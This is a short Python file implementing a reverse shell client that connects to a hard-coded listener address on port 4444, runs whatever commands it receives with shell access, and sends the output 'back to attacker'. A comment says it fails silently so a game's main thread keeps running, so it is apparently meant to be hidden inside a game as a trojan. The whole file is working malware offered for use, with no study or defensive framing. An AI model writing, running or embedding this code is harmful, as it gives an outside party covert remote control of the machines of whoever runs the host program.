import socket
import subprocess
import os

def start_connection():
    # The IP of the machine running listener.py (use "127.0.0.1" for local testing)
    host = "10.12.75.190" 
    port = 4444
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        while True:
            # Receive command from listener
            data = s.recv(1024).decode("utf-8")
            
            if data.lower() == "exit":
                break
            
            # Execute command and capture output
            if data.startswith("cd "):
                try:
                    os.chdir(data[3:].strip())
                    result = f"Changed directory to {os.getcwd()}"
                except Exception as e:
                    result = str(e)
            else:
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                result = result.decode("utf-8")
                
            if not result:
                result = "Command executed (No output)"
                
            # Send result back to attacker
            s.send(result.encode("utf-8"))
            
        s.close()
    except Exception:
        # Fail silently so the game (main thread) keeps running without errors
        pass
